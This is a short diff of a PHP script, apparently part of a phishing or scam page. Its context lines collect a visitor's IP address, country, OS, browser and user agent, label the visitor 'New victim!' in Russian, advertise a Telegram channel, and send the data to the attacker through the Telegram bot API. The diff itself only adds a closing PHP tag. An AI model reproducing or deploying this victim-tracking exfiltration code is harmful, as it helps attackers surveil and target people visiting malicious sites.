@@ -119,3 +119,4 @@ $site_refer = $_SERVER['HTTP_REFERER'];
  $chat_id = "1843765115";// Ваш chat id
  $txt = urlencode("Наш Telegram Канал: @slivmens\nНовая жертва!\nIP:{$ip}\nСтрана:{$country}\nОС:{$user_os}\nБраузер:{$user_browser}\nUser Agent:{$user_agent}");
  $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
+?>
